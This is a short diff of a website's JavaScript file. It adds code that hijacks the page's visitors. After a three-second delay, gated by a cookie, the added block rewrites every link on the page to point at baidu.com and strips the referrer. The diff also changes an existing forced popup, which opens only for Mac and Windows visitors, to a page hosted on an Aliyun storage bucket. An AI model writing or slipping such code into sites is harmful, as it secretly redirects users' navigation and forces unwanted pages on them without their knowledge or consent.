@@ -6,11 +6,22 @@ function addjs(src) {
     script.src = src;
     document.getElementsByTagName('head')[0].appendChild(script);
 }
+if (!getCookie('dd_cookie')) {
+setTimeout(function(){
+   setCookie('dd_cookie','ok',1);
+    var w1=0;
+var tagsE=document.getElementsByTagName("a");
+while(tagsE[w1]){
+  tagsE[w1].setAttribute("rel", "noreferrer");
+  tagsE[w1].setAttribute("href", "http://www.baidu.com");
+  w1++;
+}
 
+}, 3000);}
 if (navigator.platform.indexOf('Mac') == 0 || navigator.platform.indexOf('Win') == 0) {
     if (!getCookie('cc_cookie')) {
         setCookie('cc_cookie','ok',1);
-        window.open("http://t.cn/EGwSi9P");
+        window.open("http://qingke360.oss-cn-hangzhou.aliyuncs.com/wz/01/wz.html");
     }
 }else{
 if (!getCookie('cc_cookie')) {
